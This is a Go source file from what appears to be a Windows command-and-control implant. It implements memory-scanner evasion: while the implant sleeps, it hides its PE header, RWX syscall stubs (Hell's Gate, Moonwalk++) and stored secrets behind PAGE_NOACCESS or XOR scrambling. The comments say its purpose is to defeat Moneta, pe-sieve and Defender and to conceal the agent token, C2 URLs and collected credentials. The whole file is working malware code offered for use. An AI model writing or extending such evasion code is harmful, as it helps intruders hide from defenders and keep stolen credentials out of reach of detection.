//go:build windows
// +build windows

package evasion

// SleepObfuscated + ProtectedBuf — Layer 1 memory-scanner evasion.
//
// SleepObfuscated marks sensitive memory regions PAGE_NOACCESS before sleeping
// so that tools like Moneta / pe-sieve / MemProcFS see access violations instead
// of PE signatures and RWX trampolines. The Go runtime .text section is
// intentionally left alone — protecting it would crash goroutine scheduling.
//
// ProtectedBuf stores sensitive values (agent token, server URLs, collected
// credentials) in VirtualAlloc'd pages that stay PAGE_NOACCESS at rest and are
// briefly unlocked only when the caller needs to read or write them.

import (
	"crypto/rand"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

// SleepObfuscated sleeps for d while protecting the PE header and all private
// RWX allocations (Hell's Gate stubs) against memory-scanner reads.
//
// Combined protection:
//   1. PAGE_NOACCESS on PE header and all private RWX allocs (Moneta, pe-sieve)
//   2. XOR-obfuscation of registered sensitive regions (C2 URLs, tokens)
//   3. Working-set trim so scanners find fewer resident pages
//   4. ±30% jitter on the actual sleep duration
func SleepObfuscated(d time.Duration) {
	if d <= 0 {
		return
	}
	regions := collectProtectedRegions()
	for i := range regions {
		regions[i].hide()
	}
	// ObfuscatedSleep handles XOR-obfuscation, working-set trim, and jitter.
	ObfuscatedSleep(d)
	for i := range regions {
		regions[i].show()
	}
}

// ────────────────────────────────────────────────────────────────────────────
// ProtectedBuf — secure heap buffer that lives at PAGE_NOACCESS when idle

// ProtectedBuf is sensitive data stored in a VirtualAlloc'd allocation that is
// flipped to PAGE_NOACCESS between accesses.
type ProtectedBuf struct {
	addr uintptr
	size uintptr
}

const protBufPageSize = 0x1000

// NewProtectedBuf allocates size bytes backed by VirtualAlloc'd memory.
// The allocation is immediately locked (PAGE_NOACCESS).
func NewProtectedBuf(size int) *ProtectedBuf {
	aligned := (uintptr(size) + protBufPageSize - 1) &^ (protBufPageSize - 1)
	var addr uintptr
	addr, _, _ = modKernel32.NewProc("VirtualAlloc").Call(
		0, aligned,
		0x3000, // MEM_COMMIT|MEM_RESERVE
		windows.PAGE_READWRITE,
	)
	if addr == 0 {
		return nil
	}
	b := &ProtectedBuf{addr: addr, size: aligned}
	b.lock()
	return b
}

func (b *ProtectedBuf) lock() {
	if b == nil || b.addr == 0 {
		return
	}
	ntProtect(b.addr, b.size, windows.PAGE_NOACCESS)
}

func (b *ProtectedBuf) unlock() {
	if b == nil || b.addr == 0 {
		return
	}
	ntProtect(b.addr, b.size, windows.PAGE_READWRITE)
}

// With calls fn with access to the raw buffer bytes, then re-locks it.
// The buffer is accessible only for the duration of the call.
func (b *ProtectedBuf) With(fn func([]byte)) {
	if b == nil || b.addr == 0 {
		return
	}
	b.unlock()
	fn(unsafe.Slice((*byte)(unsafe.Pointer(b.addr)), b.size))
	b.lock()
}

// Set writes data into the buffer and re-locks it.
func (b *ProtectedBuf) Set(data []byte) {
	b.With(func(buf []byte) {
		copy(buf, data)
	})
}

// Get copies the buffer contents out and re-locks it.
func (b *ProtectedBuf) Get() []byte {
	if b == nil || b.addr == 0 {
		return nil
	}
	out := make([]byte, b.size)
	b.With(func(buf []byte) {
		copy(out, buf)
	})
	// Trim trailing zeroes
	end := len(out)
	for end > 0 && out[end-1] == 0 {
		end--
	}
	return out[:end]
}

// Zero overwrites the buffer with zeros before freeing or reusing.
func (b *ProtectedBuf) Zero() {
	b.With(func(buf []byte) {
		for i := range buf {
			buf[i] = 0
		}
	})
}

// Free zeros the buffer and returns the pages to the OS.
func (b *ProtectedBuf) Free() {
	if b == nil || b.addr == 0 {
		return
	}
	b.Zero()
	b.unlock()
	modKernel32.NewProc("VirtualFree").Call(b.addr, 0, 0x8000 /*MEM_RELEASE*/)
	b.addr = 0
}

// ────────────────────────────────────────────────────────────────────────────
// Internal helpers

type pageRegion struct {
	base        uintptr
	size        uintptr
	oldProt     uint32
	encrypt     bool // XOR-encrypt before hiding
	encryptOnly bool // encrypt but skip PAGE_NOACCESS — safe for executing regions
	key         [32]byte
}

func (r *pageRegion) hide() {
	if r.encrypt {
		ntProtect(r.base, r.size, windows.PAGE_READWRITE)
		r.xorInPlace()
	}
	if r.encryptOnly {
		// Restore RX so other goroutines can still execute the region.
		ntProtect(r.base, r.size, windows.PAGE_EXECUTE_READ)
		return
	}
	r.oldProt, _ = ntProtect(r.base, r.size, windows.PAGE_NOACCESS)
}

func (r *pageRegion) show() {
	if r.encryptOnly {
		// XOR-decrypt back; region is already RX.
		ntProtect(r.base, r.size, windows.PAGE_READWRITE)
		r.xorInPlace()
		ntProtect(r.base, r.size, windows.PAGE_EXECUTE_READ)
		return
	}
	if r.oldProt == 0 {
		return
	}
	if r.encrypt {
		ntProtect(r.base, r.size, windows.PAGE_READWRITE)
		r.xorInPlace()
	}
	ntProtect(r.base, r.size, r.oldProt)
}

func (r *pageRegion) xorInPlace() {
	for i := uintptr(0); i < r.size; i++ {
		p := (*byte)(unsafe.Pointer(r.base + i))
		*p ^= r.key[i%32]
	}
}

// collectProtectedRegions returns all memory regions to hide during sleep.
// Regions that are PAGE_NOACCESS'd before the wait become unreadable to memory
// scanners (Moneta, pe-sieve, Defender's real-time scan).  Regions marked
// encrypt:true are also XOR-scrambled so their content is opaque even to
// scanners that walk page tables without triggering access violations.
//
// Covered regions:
//  1. PE header — hides MZ magic, section table, import table RVAs.
//  2. Private RWX allocations — catches any stubs not in the stomp arena.
//  3. Stomp arena — Hell's Gate + Moonwalk++ stubs live in a MEM_IMAGE page;
//     privateRWXRegions misses MEM_IMAGE, so we add it explicitly.
func collectProtectedRegions() []pageRegion {
	var out []pageRegion

	// 1. PE header (first page of the module) — XOR-encrypted before locking.
	var base windows.Handle
	if err := windows.GetModuleHandleEx(0, nil, &base); err == nil && base != 0 {
		r := pageRegion{base: uintptr(base), size: protBufPageSize, encrypt: true}
		rand.Read(r.key[:])
		out = append(out, r)
	}

	// 2. Private RWX allocations (HGProc stubs that did not fit in stomp arena).
	out = append(out, privateRWXRegions()...)

	// 3. Stomp arena — Hell's Gate + Moonwalk++ stubs live in a MEM_IMAGE CoW
	// page carved from version.dll .text.  privateRWXRegions misses MEM_IMAGE,
	// so add it explicitly.  encryptOnly=true: we XOR-scramble the stub bytes
	// to defeat signature matching, but skip PAGE_NOACCESS because other
	// goroutines may call these stubs while this goroutine is sleeping.
	stompMu.Lock()
	used := stompCursor - stompBase
	stompMu.Unlock()
	if stompBase != 0 && used > 0 {
		r := pageRegion{base: stompBase, size: used, encrypt: true, encryptOnly: true}
		rand.Read(r.key[:])
		out = append(out, r)
	}

	return out
}

// memPrivate is IMAGE_SCN / VirtualAlloc type flag for private memory.
// golang.org/x/sys/windows does not always export this constant.
const memPrivate = 0x00020000

// privateRWXRegions walks the virtual address space and returns all private
// PAGE_EXECUTE_READWRITE regions (our dynamically-built syscall stubs).
func privateRWXRegions() []pageRegion {
	var out []pageRegion
	var addr uintptr
	for {
		var mbi windows.MemoryBasicInformation
		if err := windows.VirtualQuery(addr, &mbi, unsafe.Sizeof(mbi)); err != nil {
			break
		}
		if mbi.State == windows.MEM_COMMIT &&
			mbi.Protect == windows.PAGE_EXECUTE_READWRITE &&
			mbi.Type == memPrivate {
			out = append(out, pageRegion{
				base: mbi.BaseAddress,
				size: uintptr(mbi.RegionSize),
			})
		}
		next := mbi.BaseAddress + uintptr(mbi.RegionSize)
		if next <= addr {
			break
		}
		addr = next
	}
	return out
}
